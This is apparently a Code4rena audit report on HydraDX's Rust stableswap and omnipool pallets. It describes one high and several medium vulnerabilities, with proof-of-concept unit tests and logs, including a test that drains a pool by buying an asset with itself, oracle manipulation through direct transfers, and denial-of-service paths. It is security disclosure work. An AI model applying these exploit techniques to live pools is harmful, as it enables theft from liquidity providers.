# Overview

## About C4

Code4rena (C4) is an open organization consisting of security researchers, auditors, developers, and individuals with domain expertise in smart contracts.

A C4 audit is an event in which community participants, referred to as Wardens, review, audit, or analyze smart contract logic in exchange for a bounty provided by sponsoring projects.

During the audit outlined in this document, C4 conducted an analysis of the HydraDX smart contract system written in Rust. The audit took place between February 2 â€” March 1, 2024.

# High Risk Findings (1)

## [[H-01] An attacker possesses the capability to exhaust the entirety of liquidity within the stable swap pools by manipulating the buy function, specifically by setting the `asset_in` parameter equal to the `asset_out` parameter ](https://github.com/code-423n4/2024-02-hydradx-findings/issues/58)
*Submitted by [castle\_chain](https://github.com/code-423n4/2024-02-hydradx-findings/issues/58), also found by [bin2chen](https://github.com/code-423n4/2024-02-hydradx-findings/issues/133)*

### Impact

This vulnerability has been identified in the Stableswap pallet that could potentially drain all liquidity from all pools without any permissions. This vulnerability can be exploited by malicious actors, resulting in significant financial losses for both the protocol and liquidity providers.

### Proof of Concept

The vulnerability lies in the `buy()` function, which can be exploited by setting `asset_in` to an asset already present in the pool and subsequently setting `asset_out` to the same asset. The function does not validate or prevent this input, allowing an attacker to receive the entire a`mount_out` without providing any corresponding `amount_in`.

**Attack Flow:**

1. The attacker calls the function `buy` and specifies the `asset_in` equal to `asset_out`, the function has no check that prevents this input to be passed.

2. The function will calculate the `amount_in` that should be taken out from the user, so the function will use `calculate_in_amount` function as shown [here](https://github.com/code-423n4/2024-02-hydradx/blob/603187123a20e0cb8a7ea85c6a6d718429caad8d/HydraDX-node/pallets/stableswap/src/lib.rs#L814) this function will call `calculate_in_given_out_with_fee()` function.

```rust
                        let (amount_in, fee_amount) = Self::calculate_in_amount(pool_id, asset_in, asset_out, amount_out)?;
```

3. The function `calculate_in_given_out_with_fee` [here](https://github.com/code-423n4/2024-02-hydradx/blob/603187123a20e0cb8a7ea85c6a6d718429caad8d/HydraDX-node/math/src/stableswap/math.rs#L98) will call the function `calculate_in_given_out` to calculate `amount_in`, and the final `amount_in` will be the amount calculated plus the fees,  and the fees are calculated as the ratio of the `amount_in`.

4. **In the function `calculate_in_given_out`, since the `asset_in` is equal to `asset_out` then the `new_reserve_in` will be equal to the old reserve `reserves[idx_in]`. Therefore, the `amount_in`, which is the difference between the new and the old reserves, will be equal to zero** as shown [here](https://github.com/code-423n4/2024-02-hydradx/blob/603187123a20e0cb8a7ea85c6a6d718429caad8d/HydraDX-node/math/src/stableswap/math.rs#L71-L79), and then the function will add 1 to the `amount_in`.

```rust
        let new_reserve_in = calculate_y_given_out::<D, Y>(amount_out, idx_in, idx_out, &reserves, amplification)?;
        let amount_in = new_reserve_in.checked_sub(reserves[idx_in])?;
        let amount_in = normalize_value(
                amount_in,
                TARGET_PRECISION,
                initial_reserves[idx_in].decimals,
                Rounding::Up,
        );
        Some(amount_in.saturating_add(1u128))
```

This will result in ` amount_in = 1  ` and with the fee, it will be equal to  `amount_in = 1.001`.

**If the attacker set `amount_out = 100_000_000_000_000` he will take them and only pay `amount_in = 1.001`.**

### Coded POC to demonstrate the vulnerability

Consider add this test into the test file `trade.rs` [here](https://github.com/code-423n4/2024-02-hydradx/blob/main/HydraDX-node/pallets/stableswap/src/tests/trades.rs), and see the logs resulted from this test:

```rust
#[test]
fn test_set_asset_in_equal_asset_out_will_be_profitable() {
	let asset_a: AssetId = 1;
	let asset_b: AssetId = 2;
	let dec_a: u8 = 18;
	let dec_b: u8 = 6;
	ExtBuilder::default()
		.with_endowed_accounts(vec![
			(BOB, asset_a, to_precision!(200, dec_a)),
			(ALICE, asset_a, to_precision!(200, dec_a)),
			(ALICE, asset_b, to_precision!(200, dec_b)),
		])
		.with_registered_asset("one".as_bytes().to_vec(), 1, dec_a)
		.with_registered_asset("two".as_bytes().to_vec(), 2, dec_b)
		.with_pool(
			ALICE,
			PoolInfo::<AssetId, u64> {
				assets: vec![asset_a, asset_b].try_into().unwrap(),
				initial_amplification: NonZeroU16::new(100).unwrap(),
				final_amplification: NonZeroU16::new(100).unwrap(),
				initial_block: 0,
				final_block: 0,
				fee: Permill::from_float(0.01),
			},
			InitialLiquidity {
				account: ALICE,
				assets: vec![
					AssetAmount::new(asset_a, to_precision!(100, dec_a)),
					AssetAmount::new(asset_b, to_precision!(100, dec_b)),
				],
			},
		)
		.build()
		.execute_with(|| {
			let pool_id = get_pool_id_at(0);
			let pool_account = pool_account(pool_id);
			let asset_a_state_before = Tokens::free_balance(asset_a, &pool_account);

			let balance_before = Tokens::free_balance(asset_a, &BOB);
			for _ in 0..5 {
				assert_ok!(Stableswap::buy(
					RuntimeOrigin::signed(BOB),
					pool_id,
					asset_a,
					asset_a,
					to_precision!(20, dec_a),
					to_precision!(31, dec_a),
				));
			}
			let asset_a_state_after = Tokens::free_balance(asset_a, &pool_account);

			// the user here received the fees
			// 229_999_999_999_999_999_994
			let balance_after = Tokens::free_balance(asset_a, &BOB);
			println!(
				"pool balance of asset a before the attack = {:?} ",
				asset_a_state_before
			);
			println!("pool balance of asset a after the attack  = {:?} ", asset_a_state_after);

			println!("balance of bob before the attack = {:?}", balance_before);
			println!(" balance of asset a owned by bob after the attack =  {:?}", balance_after);
			println!(" the amount of profit for BOB: {:?}", balance_after - balance_before);
		});
}
```

The logs will be:

```rust
running 1 test
pool balance of asset a before the attack = 100000000000000000000 
pool balance of asset a after the attack  = 28 
balance of bob before the attack = 200000000000000000000
 balance of asset a owned by bob after the attack =  299999999999999999972
 the amount of profit for BOB: 99999999999999999972
```

As shown here, Bob can drain almost all the liquidity of `asset_a` in the pool, and he can repeat this attack to drain all the assets exists in all the pools.

### Recommended Mitigation Steps

To mitigate this vulnerability, it is crucial to prevent the setting of `asset_in` equal to `asset_out`. This can be achieved by adding the following line to the `buy()` function:

```diff
                pub fn buy(
                        origin: OriginFor<T>,
                        pool_id: T::AssetId,
                        asset_out: T::AssetId,
                        asset_in: T::AssetId,
                        amount_out: Balance,
                        max_sell_amount: Balance,
                ) -> DispatchResult {
                        let who = ensure_signed(origin)?;


+                        ensure!(
+                 asset_out != asset_in, Error::<T>::Invalid
+                );
```

Integrating this check into the `buy()` function will effectively prevent attackers from draining liquidity from the pool.

# Medium Risk Findings (10)

## [[M-01] Users can MAKE EMA-Oracle price outdated with direct transfers to StableSwap](https://github.com/code-423n4/2024-02-hydradx-findings/issues/176)
*Submitted by [J4X](https://github.com/code-423n4/2024-02-hydradx-findings/issues/176)*

The EMA oracle, designed to utilize HydraDX's Omnipools and StableSwap for exchange rate information, operates by monitoring activities within these liquidity pools. It looks for specific operations like exchanges, deposits, and withdrawals to adjust the assets' exchange rates accordingly. This updating process is not continuous but occurs when the responsible hooks are called by the StableSwap/Omnipool.

The system, although thorough, does not account for price update triggers in the event of direct asset transfers to Stableswap, as these do not set off any hooks within the oracle. This lapse means that such direct transfers can alter asset prices within the liquidity pools without the oracle's knowledge, potentially leading to misleading exchange rates.

Moreover, there's a risk of manipulation by bad actors who might use direct transfers to StableSwap in an effort to sway the arbitrage process, especially during periods of network congestion. Such interference could unjustly prevent necessary liquidations within lending protocols.

### Impact

The issue allows a malicious user to change the price of the AMM without updating the oracle.

### Proof of Concept

The issue can be validated when looking at the runtime configuration. The configuration only restricts transfers to the Omnipool address, but not to the StableSwap address:

```rust
// filter transfers of LRNA and omnipool assets to the omnipool account
if let RuntimeCall::Tokens(orml_tokens::Call::transfer { dest, currency_id, .. })
| RuntimeCall::Tokens(orml_tokens::Call::transfer_keep_alive { dest, currency_id, .. })
| RuntimeCall::Tokens(orml_tokens::Call::transfer_all { dest, currency_id, .. })
| RuntimeCall::Currencies(pallet_currencies::Call::transfer { dest, currency_id, .. }) = call
{
	// Lookup::lookup() is not necessary thanks to IdentityLookup
	if dest == &Omnipool::protocol_account() && (*currency_id == hub_asset_id || Omnipool::exists(*currency_id))
	{
		return false;
	}
}
// filter transfers of HDX to the omnipool account
if let RuntimeCall::Balances(pallet_balances::Call::transfer { dest, .. })
| RuntimeCall::Balances(pallet_balances::Call::transfer_keep_alive { dest, .. })
| RuntimeCall::Balances(pallet_balances::Call::transfer_all { dest, .. })
| RuntimeCall::Currencies(pallet_currencies::Call::transfer_native_currency { dest, .. }) = call
{
	// Lookup::lookup() is not necessary thanks to IdentityLookup
	if dest == &Omnipool::protocol_account() {
		return false;
	}
}
```

### Recommended Mitigation Steps

The issue can be mitigated by disabling transfers to the StableSwap pools, similar to how it is implemented for the Omnipool.

The same impact (but for omnipool) has already been found in one of the earlier [audits](https://github.com/galacticcouncil/HydraDX-security/blob/main/audit-reports/230619-Runtime-Verification-EMA-Oracle-Security-Audit.pdf) at Finding A1, this is why I kept my issue intentionally rather short, which was suboptimal in hindsight. 
> 
> The oracle should always return the current price of the assets at stableswap/omnipool. As identified in the other audit this could be broken for the Omnipool by transferring assets directly to the Omnipool, making the price outdated. This was confirmed as a medium severity finding by the sponsor and fixed by implementing guards that blocked any transfers of tokens directly to the Omnipool. Unfortunately, the team has forgotten to implement the same safety measures when the StableSwap AMM was added to the protocol. As a result of this, the attack path is once again possible for all assets listed on StableSwap.

The impact that #73 describes is "So any protocol that uses this oracle as a price source would receive an incorrect price for the re-added asset for a short period of time" which can be shortened down to "external protocols relying on this oracle might break". My issue describes "Such interference could unjustly prevent necessary liquidations within lending protocols" which can also be shortened to  "external protocols relying on this oracle might break too". It is just more focused on lending protocols, as this is the first thing that came to mind for me.

## [[M-02] Malicious liquidity provider can put pool into highly manipulatable state](https://github.com/code-423n4/2024-02-hydradx-findings/issues/154)
*Submitted by [J4X](https://github.com/code-423n4/2024-02-hydradx-findings/issues/154), also found by [carrotsmuggler](https://github.com/code-423n4/2024-02-hydradx-findings/issues/83) and [3docSec](https://github.com/code-423n4/2024-02-hydradx-findings/issues/42)*

The StableSwap AMM of the HydraDx protocol implements safeguards against low liquidity so that too high price fluctuations are prevented, and manipulating the price becomes harder. These safeguards are enforced based on the `MinPoolLiquidity` which is a constant that describes the minimum liquidity that should be in a pool. Additionally, a pool is allowed to have a liquidity of 0, which would occur in the case of the creation of the pool, or by users withdrawing all their liquidity. This could also be defined as an invariant.

`totalPoolIssuance(poolId) >= MinPoolLiquidity || totalPoolIssuance(poolId) == 0`.

When a user wants to withdraw his liquidity, he can use either the `remove_liquidity_one_asset()` function or the `withdraw_asset_amount()` function.

**`remove_liquidity_one_asset()`:**

To ensure holding the invariant 2 checks are implemented in the `remove_liquidity_one_asset()` function. The first checks if the user either leaves more than `MinPoolLiquidity` shares in the pool or withdraws all his shares:

```rust
let current_share_balance = T::Currency::free_balance(pool_id, &who);

ensure!(
	current_share_balance == share_amount
		|| current_share_balance.saturating_sub(share_amount) >= T::MinPoolLiquidity::get(),
	Error::<T>::InsufficientShareBalance
);
```

The second checks if the total liquidity in the pool would fall below the intended amount of shares:

```rust
let share_issuance = T::Currency::total_issuance(pool_id);

ensure!(
	share_issuance == share_amount
		|| share_issuance.saturating_sub(share_amount) >= T::MinPoolLiquidity::get(),
	Error::<T>::InsufficientLiquidityRemaining
);
```

These two checks work perfectly at holding the invariant at all times.

**`withdraw_asset_amount()`:**

Unfortunately, the second function for withdrawing liquidity `withdraw_asset_amount()` omits one of the checks. The function only checks if the user either withdraws all his shares or leaves more than the `MinPoolLiquidity` shares.

```rust
let current_share_balance = T::Currency::free_balance(pool_id, &who);

ensure!(
	current_share_balance == shares
		|| current_share_balance.saturating_sub(shares) >= T::MinPoolLiquidity::get(),
	Error::<T>::InsufficientShareBalance
);
```

One might state now that this could never break the invariant, as if every user's shares are either more than `MinPoolLiquidity` or zero, the total liquidity can never fall below `MinPoolLiquidity` without being 0. Unfortunately, this approach forgets that users can transfer their shares to other addresses. This allows a user to transfer an amount as low as 1 share to another address, and then withdraw all his shares. As the check would only ensure that he is withdrawing all his shares it would pass. If he was the only liquidity provider, there now would only be 1 share of liquidity left in the pool breaking the invariant of: `totalPoolIssuance(poolId) >= MinPoolLiquidity`.

### Impact

The issue allows a user to break the invariant about the `MinPoolLiquidity` and either push the pool into a state where it can easily be manipulated, or prevent other users from withdrawing their shares.

### Proof of Concept

There are 2 ways how this could be exploited:

**1. Breaking the invariant and letting the pool Liquidity fall below `MinPoolLiquidity`**

A malicious LP could abuse this functionality to push the pool into a state where its total liquidity is below `MinPoolLiquidity`, and could be as low as 1 share, allowing for easy price manipulation. To achieve this the attacker would do the following:

1. User deposits `MinPoolLiquidty` using one of the functions.
2. User transfers 1 share to another address controlled by him (so he does not lose any value).
3. User withdraws all his shares using `withdraw_asset_amount()`.
4. The function will pass as it does not check the whole pool liquidity.
5. The pool now only has 1 share of liquidity inside and can easily be manipulated.

**2. DOSing withdrawing through `remove_liquidity_one_asset` for others**

Let's consider a case where there are only 2 liquidity providers and one of them is malicious and wants to prevent the other from withdrawing through `remove_liquidity_one_asset()`. This could for example be the case if the other is a smart contract, that can only withdraw through this function.

1. Both deposit `MinPoolLiquidty`.
2. Malicious user transfers 1 share to another address controlled by him (so he does not lose any value).
3. Malicious user withdraws all his liquidity using `withdraw_asset_amount()`.
4. Normal user now tries to withdraw all of his liquidity using `remove_liquidity_one_asset()`.
5. The call fails as the total pool liquidity (which is checked in this one) would fall below `MinPoolLiquidty`.
6. The user is forced to keep his liquidity in the pool until someone else adds liquidity.

### Recommended Mitigation Steps

The issue can be mitigated by also adding a check for the total pool liquidity to `withdraw_asset_amount()`:

```solidity
let share_issuance = T::Currency::total_issuance(pool_id);

ensure!(
	share_issuance == share_amount
		|| share_issuance.saturating_sub(share_amount) >= T::MinPoolLiquidity::get(),
	Error::<T>::InsufficientLiquidityRemaining
);
```

> ### 1. DOS
> Regarding the DOS, this issue still leads to a DOS on one of the functions of the protocol, which suffices medium, as per the severity guidelines Med requires "Assets not at direct risk, but the function of the protocol or its availability could be impacted". In this case, the function of `remove_liquidity_one_asset()` is clearly impacted and not usable. I mentioned in my issue that the user could be a contract, which is programmed to interact through the `remove_liquidity_one_asset()` function. As a lot of the interactions with an AMM are actually contracts and not EOA, this is a very usual case. The contract can't be changed later on so it would never be able to withdraw its shares again, although being 100% correctly programmed. 
> 
> ### 2. Broken Invariant
> From the code, one can see that the intended invariant for the liquidity in a pool is `sharesInPool == 0 || sharesInPool >= MinPoolLiquidty`. This is done so that pools with very low liquidity can't exist as they can easily be manipulated, which a lot of other AMMs do too. The sponsor described this as "to protect mainly the users" in the comment above. This issue shows in "1. Breaking the invariant and letting the pool Liquidity fall below MinPoolLiquidity" how this invariant can be broken so that the pool is easily manipulatable. How this should be graded can be seen in the Supreme Court [decisions](https://docs.code4rena.com/awarding/judging-criteria/supreme-court-decisions-fall-2023):
> 
> ```
> High - A core invariant of the protocol can be broken for an extended duration.
> 
> Medium - A non-core invariant of the protocol can be broken for an extended duration or at scale, or an otherwise high-severity issue is reduced due to hypotheticals or external factors affecting likelihood.
> ```
> 
> ### 3. Conclusion
> So in total, the issue leads to 2 impacts, which both would be (at least) of medium severity:
> 
> 1. DOS of the `remove_liquidity_one_asset()` function.
> 2. Breaking of the Pool liquidity invariant.

The liquidity removal function in the `omnipool` pallet lacks slippage control. There is no `minimum_amount_out` parameter to ensure that the user gets out at least a certain amount of tokens. This can lead to slippage losses for liquidity providers if malicious users frontrun the liquidity withdrawer.

During liquidity removal, since there are lots of different fees involved, the scenario gets complicated and a POC is used to study the effect further. A POC is presented in the next section, which has ALICE depositing LP of `token_1000` to the pool, the actor LP3 carrying out a swap, and then ALICE removing liquidity immediately after. In case ALICE receives any LRNA tokens, she swaps them out to `token_1000`. We compare the amount of `token_1000` ALICE would end up with in different scenarios.

In all scenarios, ALICE is assumed to remove liquidity at the same price she put in. However the bad actor LP3 frontruns her removal, and we want to study the effect of her losses. In scenario 1, there is no action by LP3, and ALICE deposits and withdraws, to get a baseline measurement.

**Scenario 1 - `Liq Add - Liq remove`:**

Here, there is no frontrunner in order to get a baseline measurement:

```
running 1 test
lrna_init: 2000000000000000
token_init: 5000000000000000

lrna_add: 2000000000000000
token_add: 4000000000000000

lrna_remove: 2000000000000000
token_remove: 4990000000000000
```

We can see ALICE started with `5000*ONE token_1000`s, and ends up with `4990*ONE token_1000`s. This is due to withdrawal fees, and is the acceptable baseline. Any lower amounts due to frontrunning would be unacceptable. This is a 0.1% loss.

**Scenario 2 - `Liq Add - token->DAI swap - Liq remove`:**

Here, the frontrunner devalues `token_1000` by selling a bunch of it for DAI. Since the price is now lower, some of Alice's shares will be burnt:

```
running 1 test
lrna_init: 2000000000000000
token_init: 5000000000000000

lrna_add: 2000000000000000
token_add: 4000000000000000

lrna_remove: 2000000000000000
token_remove: 4961892744479493
```

In this scenario, ALICE ends up with `4961.89*ONE token_1000`s. This is nearly a 1% loss. Since some of her share tokens are burnt, the other liquidity providers profit from this, since their liquidity positions are now worth more.

**Scenario 3 - `Liq Add - DAI->token swap - Liq remove`:**

Here, the frontrunner buys up `token_1000` increasing its price. Alice gets minted LRNA tokens to compensate the increase in price, but she swaps them out to `token_1000` immediately. We then check her `token_1000` balance and compare it to the beginning:

```
running 1 test
lrna_init: 2000000000000000
token_init: 5000000000000000

lrna_add: 2000000000000000
token_add: 4000000000000000

lrna_remove: 2187637667548876
token_remove: 4841500000000000

lrna_end: 2000000000000000
token_end: 4958579804661321
```

Here ALICE ends up with `4958.57*ONE token_1000`s. This is again a 1% loss. The frontrunner can even sandwich the `LRNA->token_1000` swap and even profit in this scenario.

Thus in all frontrunning scenarios, ALICE realizes a slippage loss due to insufficient parameters. The losses will be capped to 2%, since the `ensure_price` check in the `remove_liquidity` function checks if the price of the asset has not changed by more than 1% from the oracle price. Thus, the maximum price deviation that can happen is 2% (if the spot price was changed from +1% to -1%). 2% slippage is already unacceptable for a number of cases, since the industry standard for swaps has been 0.5%, and even lower for liquidity removals.

### Proof of Concept

The following test was run to generate the figures above. For the different scenarios, the `buy` was commented (scenario 1), used to `swap token->DAI` (scenario 2), and used to `swap DAI->token` (scenario 3).

## [[M-04] Complete liquidity removals fail from stableswap pools](https://github.com/code-423n4/2024-02-hydradx-findings/issues/86)
*Submitted by [carrotsmuggler](https://github.com/code-423n4/2024-02-hydradx-findings/issues/86), also found by [QiuhaoLi](https://github.com/code-423n4/2024-02-hydradx-findings/issues/198) and [J4X](https://github.com/code-423n4/2024-02-hydradx-findings/issues/64)*

<https://github.com/code-423n4/2024-02-hydradx/blob/603187123a20e0cb8a7ea85c6a6d718429caad8d/HydraDX-node/pallets/stableswap/src/lib.rs#L638><br>

### Impact

The contracts for stableswap has 2 functions dealing with removal of liquidity: `remove_liquidity_one_asset` and `withdraw_asset_amount`. However, both these functions allow redeeming LP tokens and payout in only one token. Critically, this contract is missing Curve protocol's `remove_liquidity` function, which allows redeeming LP tokens for all the different tokens in the pool.

The result of this decision is that when the complete liquidity of a pool is to be removed, the contract reverts with an arithmetic overflow. In curve protocol, when removing the complete liquidity, the composing tokens are removed from the pool. However, they also need to be converted to a single token, using a liquidity that won't exist anymore. This leads to an issue somewhere in the mathematics of the curve liquidity calculation, and thus reverts.

### Proof of Concept

A simple POC to remove the complete liquidity is coded up below. This POC reverts when the entire amount of shares is being redeemed.

```rust
#[test]
fn test_Attack_min_shares() {
	let asset_a: AssetId = 1;
	let asset_b: AssetId = 2;
	let asset_c: AssetId = 3;

	ExtBuilder::default()
		.with_endowed_accounts(vec![
			(BOB, asset_a, 2*ONE),
			(ALICE, asset_a, 1*ONE),
			(ALICE, asset_b, 1*ONE),
			(ALICE, asset_c, 1*ONE),
		])
		.with_registered_asset("one".as_bytes().to_vec(), asset_a, 18)
		.with_registered_asset("two".as_bytes().to_vec(), asset_b, 6)
		.with_registered_asset("three".as_bytes().to_vec(), asset_c, 6)
		.with_pool(
			ALICE,
			PoolInfo::<AssetId, u64> {
				assets: vec![asset_a, asset_b, asset_c].try_into().unwrap(),
				initial_amplification: NonZeroU16::new(2000).unwrap(),
				final_amplification: NonZeroU16::new(2000).unwrap(),
				initial_block: 0,
				final_block: 0,
				fee: Permill::zero(),
			},
			InitialLiquidity {
				account: ALICE,
				assets: vec![
					AssetAmount::new(asset_a, 1*ONE),
					AssetAmount::new(asset_b, 1*ONE),
					AssetAmount::new(asset_c, 1*ONE),
				],
			},
		)
		.build()
		.execute_with(|| {
			let pool_id = get_pool_id_at(0);

			let received = Tokens::free_balance(pool_id, &ALICE);
            println!("LP tokens received: {}", received);


            assert_ok!(Stableswap::remove_liquidity_one_asset(
                RuntimeOrigin::signed(ALICE),
                pool_id,
                asset_a,
                received,
                0
            ));

            let asset_a_remliq_bal = Tokens::free_balance(asset_a, &ALICE);
            println!("asset a rem: {}", asset_a_remliq_bal);
		});
}
```

Here ALICE adds liquidity, and is trying to redeem all her LP tokens. This reverts with the following:

```
running 1 test
LP tokens received: 23786876415280195891619
thread 'tests::add_liquidity::test_Attack_min_shares' panicked at 'Expected Ok(_). Got Err(
    Arithmetic(
        Overflow,
    ),
)', pallets/stableswap/src/tests/add_liquidity.rs:889:13
note: run with `RUST_BACKTRACE=1` environment variable to display a backtrace
test tests::add_liquidity::test_Attack_min_shares ... FAILED
```

This is because the internal math of the stableswap algorithm fails when there is no more liquidity.

### Tools Used

Substrate

### Recommended Mitigation Steps

Allow multi-token liquidity withdrawal, which would allow complete redeeming of all LP tokens.

### Assessed type

Under/Overflow

## [[M-05] No `safe_withdrawal` option in `withdraw_protocol_liquidity` function in omnipool can be abused by frontrunners to cause losses to the admin when removing liquidity](https://github.com/code-423n4/2024-02-hydradx-findings/issues/84)
*Submitted by [carrotsmuggler](https://github.com/code-423n4/2024-02-hydradx-findings/issues/84), also found by [QiuhaoLi](https://github.com/code-423n4/2024-02-hydradx-findings/issues/177)*

The `sacrifice_position` function can be used by any liquidity provider to hand over their liquidity position to the protocol. The protocol can then choose to remove this liquidity via the `withdraw_protocol_liquidity` function. This is similar to the `remove_liquidity` function, but with one key difference. The `remove_liquidity` function has a `safe_withdrawal` option, where if trading is ongoing, the price difference is limited to 1% via the `ensure_price` function. This is not present in the `withdraw_protocol_liquidity` function.

```rust
// remove_liquidity
if !safe_withdrawal {
        T::PriceBarrier::ensure_price(
            &who,
            T::HubAssetId::get(),
            asset_id,
            EmaPrice::new(asset_state.hub_reserve, asset_state.reserve),
        )
        .map_err(|_| Error::<T>::PriceDifferenceTooHigh)?;
    }
```

Thus when the admin decides to call `withdraw_protocol_liquidity` to remove the liquidity, they can be frontrun to eat slippage loss. The admin has to pass in a `price` parameter, and if the frontrunner manipulates the spot price to be different from the price passed in, the admin will eat losses. A deeper dive and simulation of losses has been done in another issue titled `No slippage check in remove_liquidity function in omnipool can lead to slippage losses during liquidity withdrawal` where the losses are limited to 2% due to the `ensure_price` check. However, the losses here can be much higher due to the lack of this check altogether.

Since higher losses can be possible, this is a high severity issue.

### Proof of Concept

The `ensure_price` check is missing from the `withdraw_protocol_liquidity` function.

### Tools Used

Substrate

### Recommended Mitigation Steps

Add a `safe_withdrawal` parameter, or add a `minimum_out` parameter to limit slippage losses.

### Assessed type

## [[M-06] complete liquidity removal will result in permanent disable of the liquidity addition and prevent minting shares for the liquidity providers.](https://github.com/code-423n4/2024-02-hydradx-findings/issues/75)
*Submitted by [castle\_chain](https://github.com/code-423n4/2024-02-hydradx-findings/issues/75)*

<https://github.com/code-423n4/2024-02-hydradx/blob/603187123a20e0cb8a7ea85c6a6d718429caad8d/HydraDX-node/pallets/omnipool/src/lib.rs#L612-L621>

### Impact

This vulnerability will lead to prevent any liquidity provider from adding liquidity and prevent them from minting new shares; so this is considered a huge loss of funds for the users and the protocol.

1. No New Liquidity - Users can no longer add liquidity to the pool, hindering its growth and potential.
2. Complete liquidity removal shuts down the pool, preventing any future activity.
3. Financial losses for the protocol - It loses the benefits of increased liquidity and potential fees from user activity.

### Proof of Concept

Adding a new token to the omnipool requires an initial liquidity deposit. This initial deposit mints the first batch of shares. Subsequent liquidity additions mint new shares proportionally to the existing total shares, ensuring a fair distribution based on the pool's current size.

In the function `remove_liquidity` it is allowed to remove all amount of liquidity from the pool, which means burning all amount of the shares from the pool, as shown [here](https://github.com/code-423n4/2024-02-hydradx/blob/603187123a20e0cb8a7ea85c6a6d718429caad8d/HydraDX-node/pallets/omnipool/src/lib.rs#L773-L790).

```rust
                        let state_changes = hydra_dx_math::omnipool::calculate_remove_liquidity_state_changes(
                                &(&asset_state).into(),
                                amount,
                                &(&position).into(),
                                I129 {
                                        value: current_imbalance.value,
                                        negative: current_imbalance.negative,
                                },
                                current_hub_asset_liquidity,
                                withdrawal_fee,
                        )
                        .ok_or(ArithmeticError::Overflow)?;


                        let new_asset_state = asset_state
                                .clone()
                                .delta_update(&state_changes.asset)
                                .ok_or(ArithmeticError::Overflow)?;
```

The function `calculate_remove_liquidity_state_changes` calculates the shares to be burnt and the `delta_update` function removes them.

If all liquidity shares have been removed from any pool, protocol shares and user shares are removed, making the `asset_reserve` equal to zero and `shares` equal to zero, which will prevent any liquidity from been added because the function `add_liquidity` does not handle the situation where there is no liquidity in the pool. As shown in the `add_liquidity` function, it calls `calculate_add_liquidity_state_changes` which calculates the shares to be minted to the LP as shown [here](https://github.com/code-423n4/2024-02-hydradx/blob/603187123a20e0cb8a7ea85c6a6d718429caad8d/HydraDX-node/math/src/omnipool/math.rs#L267-L269).

```rust
        let delta_shares_hp = shares_hp
                .checked_mul(amount_hp)
                .and_then(|v| v.checked_div(reserve_hp))?;
```

The state of the pool after all liquidity have been removed `asset_reserve = 0, shares = 0`. Since there is no liquidity in the pool so the `reserve_hp` will be equal to zero, so this part will always return error, so this function will always revert.

Even if any user donates some assets to prevent this function from reverting, the liquidity provider will always receive zero shares, since the `delta_shares_hp` will always equal to zero, which is considered loss of funds for the user and the protocol.

The bad state that will cause this vulnerability:<br>
**Token has been added to the pool but all liquidity has been removed from it**.

### Coded Poc

Consider adding this test in `remove_liquidity.rs` test [file](https://github.com/code-423n4/2024-02-hydradx/blob/main/HydraDX-node/pallets/omnipool/src/tests/remove_liquidity.rs), and then run it to see the logs:

```rust

			let liq_removed = 400 * ONE;
			println!(

			);
			assert!(

				"Position instance was not burned"
			);
			let pos = Positions::<Test>::get(2);
			println!(" the lp2_position before all liquidity removal: {:?}", pos.unwrap());
			// lp2 remove his all initial liquidity
			assert_ok!(Omnipool::remove_liquidity(RuntimeOrigin::signed(LP2), 2, 2000 * ONE));
			let lp2_position = lp1_position_id - 1;

			assert!(Positions::<Test>::get(lp2_position).is_none(), "Position still found");

			println!(
				"the final state after all liquidity has been removed: {:?} ",
				Omnipool::load_asset_state(1000).unwrap()
			);
			let liq_added = 400 * ONE;
			assert_noop!(
				Omnipool::add_liquidity(RuntimeOrigin::signed(LP1), 1_000, liq_added),
				ArithmeticError::Overflow
			);
			// this makes sure that there is no position created after
			assert!(Positions::<Test>::get(lp2_position).is_none(), "Position still found");

			println!(
				"the new state after liquidity provision reverted: {:?}",
				Omnipool::load_asset_state(1000).unwrap()
			);
		});
}
```

The logs will be:

```rust
running 1 test
asset state before liquidity removal AssetReserveState { reserve: 2400000000000000, hub_reserve: 1560000000000000, shares: 2400000000000000, protocol_shares: 0, cap: 1000000000000000000, tradable: SELL | BUY | ADD_LIQUIDITY | REMOVE_LIQUIDITY } 
 the lp2_position before all liquidity removal: Position { asset_id: 1000, amount: 2000000000000000, shares: 2000000000000000, price: (650000000000000000, 1000000000000000000) }
the final state after all liquidity has been removed: AssetReserveState { reserve: 0, hub_reserve: 0, shares: 0, protocol_shares: 0, cap: 1000000000000000000, tradable: SELL | BUY | ADD_LIQUIDITY | REMOVE_LIQUIDITY } 
the new state after liquidity provision reverted: AssetReserveState { reserve: 0, hub_reserve: 0, shares: 0, protocol_shares: 0, cap: 1000000000000000000, tradable: SELL | BUY | ADD_LIQUIDITY | REMOVE_LIQUIDITY }
```

This illustrates that the `add_liquidity` function failed after `lp2` and `lp1` removed their entire liquidity from the pool.

### Tools Used

VS Code

### Recommended Mitigation Steps

Add a special behaviour to the function `add_liquidity` to handle the situation of no initial liquidity. The mitigation can be done by:

* When the pool initially has no shares (total shares equal zero), newly added assets from a liquidity provider trigger the minting of shares in an amount equal to the added asset value

As happening in the function `add_token()` [here](https://github.com/code-423n4/2024-02-hydradx/blob/603187123a20e0cb8a7ea85c6a6d718429caad8d/HydraDX-node/pallets/omnipool/src/lib.rs#L532).

```rust
                                delta_shares: BalanceUpdate::Increase(amount),
```

> Firstly, this was marked as a duplicate of Issue [#86](https://github.com/code-423n4/2024-02-hydradx-findings/issues/86). However, Issue #86 has nothing to do with this finding for these reasons:
>* Issue #86 refers to an issue in the stableswap pallet, not the omnipool. **This finding, on the other hand, refers to an issue in the omnipool pallet.**
>* While removing all liquidity from a pool in the stableswap will always fail according to Issue #86, removing all liquidity from a pool in the omnipool pallet will succeed, but it will cause a permanent DoS (Denial-of-Service) attack on the pool by permanently disabling liquidity addition due to the division by zero which will throw overflow error mentioned in the submitted report and the PoC.

> The judge mentioned that the report did not mention the full impact. While I described it in the impact section, let me clarify:
>
> ### The full impact mentioned in the report: permanent disable of liquidity addition `==` permanent DoS of the function `add_liquidity`. 
> Since this is an edge case, which can simply happen, that causes a permanent DoS forever, it does not require an attacker or an attack to be triggered and cause damage to the protocol. **However, an attacker could trigger this edge case as the PoC test got performed, you can consider the `LP2` as the attacker, who can withdraw all the liquidity that he possessed leaving the pool in DoS state.** The DoS can also happen without an attacker, simply by users removing all liquidity from the pool.

> 
> ### POC for the attack done by a malicious user
> 
> Please consider running my submitted PoC to check that the attack flow got executed successfully, you can also consider `LP2` as the `position_owner`. 
> 
> **The attacker also can be the `position_owner` which is untrusted entity, or another malicious user, or as normal action done by the liquidity providers; the `position_owner`, who is the initial liquidity provider, can perform this attack and DoS the entire pool after adding the token by the `authority_origin` immediately.**
>
> The attack flow:
